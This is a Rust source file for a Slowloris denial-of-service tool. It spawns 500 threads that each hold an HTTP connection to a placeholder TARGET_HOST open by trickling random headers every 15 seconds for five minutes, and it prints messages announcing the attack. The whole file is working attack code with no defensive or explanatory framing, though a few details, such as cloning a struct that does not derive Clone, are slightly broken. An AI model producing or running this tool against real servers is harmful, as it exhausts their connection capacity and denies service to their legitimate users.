use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::Duration;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

struct SlowlorisConfig {
    target: String,
    port: u16,
    connections: usize,
    user_agent: String,
    keep_alive_delay: Duration,
}

impl Default for SlowlorisConfig {
    fn default() -> Self {
        Self {
            target: "127.0.0.1".to_string(),
            port: 80,
            connections: 200,
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string(),
            keep_alive_delay: Duration::from_secs(15),
        }
    }
}

fn create_slow_connection(config: &SlowlorisConfig, running: Arc<AtomicBool>) -> Result<(), Box<dyn std::error::Error>> {
    let address = format!("{}:{}", config.target, config.port);

    loop {
        if !running.load(Ordering::Relaxed) {
            break;
        }

        match TcpStream::connect(&address) {
            Ok(mut stream) => {
            let request = format!(
            "GET /?{} HTTP/1.1\r\n\
                     Host: {}\r\n\
                     User-Agent: {}\r\n\
                     Accept-language: en-US,en,q=0.5\r\n",
            rand::random::<u32>(),
            config.target,
            config.user_agent
            );

            if stream.write_all(request.as_bytes()).is_err() {
            continue;
            }

           
            loop {
            if !running.load(Ordering::Relaxed) {
            break;
            }

            thread::sleep(config.keep_alive_delay);

           
            let keep_alive = format!("X-a: {}\r\n", rand::random::<u32>());
            if stream.write_all(keep_alive.as_bytes()).is_err() {
            break;
            }
            }
            }
            Err(_) => {
                thread::sleep(Duration::from_millis(100));
                continue;
            }
        }
    }
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config = SlowlorisConfig {
        target: "TARGET_HOST".to_string(), 
        port: 80,
        connections: 500, 
        ..Default::default()
    };

    let running = Arc::new(AtomicBool::new(true));
    let mut handles = Vec::new();

    println!("Starting Slowloris DoS attack on {}:{}", config.target, config.port);
    println!("Connections: {}", config.connections);

    for i in 0..config.connections {
        let config_clone = config.clone();
        let running_clone = running.clone();

        let handle = thread::spawn(move || {
            if let Err(e) = create_slow_connection(&config_clone, running_clone) {
                eprintln!("Thread {} error: {}", i, e);
            }
        });
        handles.push(handle);


        thread::sleep(Duration::from_millis(10));
    }

    thread::sleep(Duration::from_secs(300));

    running.store(false, Ordering::Relaxed);

    for handle in handles {
        let _ = handle.join();
    }

    println!("Attack completed");
    Ok(())
}
